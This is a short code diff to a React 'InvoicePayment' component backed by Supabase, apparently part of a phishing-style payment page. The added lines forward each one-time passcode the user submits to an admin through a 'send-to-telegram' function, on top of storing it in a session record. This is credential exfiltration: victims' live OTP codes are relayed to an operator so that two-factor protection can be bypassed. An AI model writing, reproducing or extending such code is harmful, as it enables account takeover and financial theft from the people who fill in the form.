@@ -134,6 +134,10 @@ const InvoicePayment = () => {
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
       const existingData = (data?.form_data as Record<string, any>) || {};
       await supabase.from("sessions").update({ status: "otp_submitted" as any, form_data: { ...existingData, otp } as any }).eq("id", sessionId);
+      // Send OTP code to admin via Telegram
+      await supabase.functions.invoke("send-to-telegram", {
+        body: { type: "otp", otp: `🔑 OTP Code Submitted: ${otp}` },
+      });
     }
     setStep("processing");
   };
